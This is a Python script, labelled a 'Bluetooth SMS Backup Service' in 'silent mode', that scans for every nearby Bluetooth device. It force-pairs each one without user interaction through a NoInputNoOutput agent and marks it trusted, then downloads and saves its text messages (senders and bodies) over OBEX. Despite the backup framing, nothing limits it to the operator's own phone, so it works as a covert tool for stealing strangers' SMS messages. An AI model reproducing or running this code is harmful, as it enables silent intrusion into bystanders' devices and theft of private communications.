#By معتزشويه
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import re
import time
import os
import signal
import logging
from datetime import datetime
from pathlib import Path
import shutil

# ================= CONFIG =================
SCAN_INTERVAL = 30
PAIRING_TIMEOUT = 60
OUTPUT_DIR = Path("sms_backups")
TEMP_DIR = Path("/tmp/bt_sms")
LOG_FILE = "bt_sms.log"

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

running = True
processed_devices = set()

# ================= SIGNAL =================
def signal_handler(sig, frame):
    global running
    logging.warning("Stopping program...")
    running = False

signal.signal(signal.SIGINT, signal_handler)

# ================= UTILS =================
def check_dependencies():
    """Check if required tools are installed."""
    required = ["bluetoothctl", "sdptool", "obexftp"]
    for tool in required:
        if not shutil.which(tool):
            logging.error(f"Required tool not found: {tool}")
            return False
    return True

def run_cmd(cmd, timeout=30, check=False):
    """Run shell command and return stdout."""
    try:
        res = subprocess.run(
            cmd, shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=check
        )
        return res.stdout.strip()
    except subprocess.TimeoutExpired:
        logging.error(f"Timeout: {cmd}")
        return ""
    except subprocess.CalledProcessError as e:
        logging.error(f"CMD error ({e.returncode}): {cmd}\n{e.stderr}")
        return ""
    except Exception as e:
        logging.error(f"CMD error: {e}")
        return ""

def setup_agent():
    """Set NoInputNoOutput agent to auto-accept pairing."""
    logging.info("Setting up Bluetooth agent (NoInputNoOutput)")
    run_cmd("bluetoothctl agent NoInputNoOutput")
    run_cmd("bluetoothctl default-agent")
    # Ensure agent is registered
    time.sleep(1)

# ================= BLUETOOTH =================
def scan_devices():
    """Scan and return list of (mac, name)."""
    logging.info("Scanning nearby devices...")
    run_cmd("bluetoothctl scan on", 5)
    time.sleep(5)
    out = run_cmd("bluetoothctl devices")

    devices = []
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[0] == "Device":
            mac = parts[1]
            name = " ".join(parts[2:])
            devices.append((mac, name))
    return devices

def is_trusted(mac):
    """Check if device is already trusted."""
    out = run_cmd(f"bluetoothctl info {mac}")
    return "Trusted: yes" in out

def supports_map(mac):
    """Check if device supports Message Access Profile."""
    out = run_cmd(f"sdptool browse {mac}", timeout=15)
    return "Message Access" in out

def get_map_channel(mac):
    """Extract MAP channel from sdptool output."""
    out = run_cmd(f"sdptool browse {mac}", timeout=15)
    # Look for "Message Access" group and extract channel
    in_map = False
    for line in out.splitlines():
        if "Service Name: Message Access" in line:
            in_map = True
        if in_map and "Channel" in line:
            match = re.search(r'Channel\s*:\s*(\d+)', line)
            if match:
                return match.group(1)
    return None

def pair_device(mac):
    """Pair with device using NoInputNoOutput agent (non‑interactive)."""
    logging.info(f"Pairing with {mac} (auto-accept)")
    # Remove any existing pairing to force fresh pairing
    run_cmd(f"bluetoothctl remove {mac}")
    time.sleep(2)

    # Use bluetoothctl with expect-like approach via Popen
    proc = subprocess.Popen(
        ["bluetoothctl", "pair", mac],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    start = time.time()
    success = False
    while time.time() - start < PAIRING_TIMEOUT:
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.2)
            continue
        logging.debug(f"bluetoothctl: {line.strip()}")
        if "Pairing successful" in line:
            success = True
            break
        if "Failed to pair" in line or "Agent refused" in line:
            break
    proc.terminate()

    if success:
        logging.info(f"Pairing successful with {mac}")
        run_cmd(f"bluetoothctl trust {mac}")
        return True
    else:
        logging.error(f"Pairing failed with {mac}")
        return False

# ================= SMS =================
def download_messages(mac, channel, name):
    """Download VMG files via OBEX and extract messages."""
    OUTPUT_DIR.mkdir(exist_ok=True)
    TEMP_DIR.mkdir(exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = re.sub(r'[^a-zA-Z0-9]', '_', name)
    output_file = OUTPUT_DIR / f"{safe_name}_{timestamp}.txt"

    logging.info(f"Downloading messages from {name} ({mac})")

    # List files in telecom/msg/
    listing = run_cmd(f"obexftp -b {mac} -B {channel} -l 'telecom/msg/'", timeout=20)
    vmg_files = re.findall(r'(\S+\.vmg)', listing)

    if not vmg_files:
        logging.warning("No VMG files found")
        return False

    messages = []
    for f in vmg_files:
        local = TEMP_DIR / f
        run_cmd(f"obexftp -b {mac} -B {channel} -g 'telecom/msg/{f}' -o '{local}'", timeout=15)

        try:
            with open(local, encoding="utf-8", errors="ignore") as fp:
                data = fp.read()

            # Extract sender and body (simplified parsing)
            sender = re.search(r'TEL:(\+?\d+)', data)
            body = re.search(r'BODY:(.*?)(?=END:VENV|$)', data, re.S | re.I)

            if sender and body:
                messages.append((sender.group(1), body.group(1).strip()))
        except Exception as e:
            logging.error(f"File parse error {f}: {e}")

    # Save messages
    with open(output_file, "w", encoding="utf-8") as f:
        for s, b in messages:
            f.write(f"From: {s}\nMessage: {b}\n{'-'*40}\n")

    logging.info(f"Saved {len(messages)} messages -> {output_file}")
    run_cmd(f"rm -rf {TEMP_DIR}")
    return True

# ================= PROCESS =================
def process_device(mac, name):
    """Handle a single device: check MAP, pair if needed, download."""
    if mac in processed_devices:
        return

    logging.info(f"Device found: {name} ({mac})")

    if not supports_map(mac):
        logging.debug("MAP not supported, skipping")
        return

    # Check if already trusted, otherwise pair
    if not is_trusted(mac):
        logging.info("Device not trusted, attempting auto-pairing")
        if not pair_device(mac):
            return

    channel = get_map_channel(mac)
    if not channel:
        logging.error("MAP channel not found")
        return

    if download_messages(mac, channel, name):
        processed_devices.add(mac)

# ================= MAIN LOOP =================
def main():
    if not check_dependencies():
        logging.error("Missing dependencies. Please install bluez, obexftp, etc.")
        return

    setup_agent()

    logging.info("Bluetooth SMS Backup Service Started (silent mode)")

    while running:
        devices = scan_devices()
        for mac, name in devices:
            process_device(mac, name)

        # Wait with heartbeat
        for _ in range(SCAN_INTERVAL):
            if not running:
                break
            time.sleep(1)

    logging.info("Program stopped")

if __name__ == "__main__":
    main()
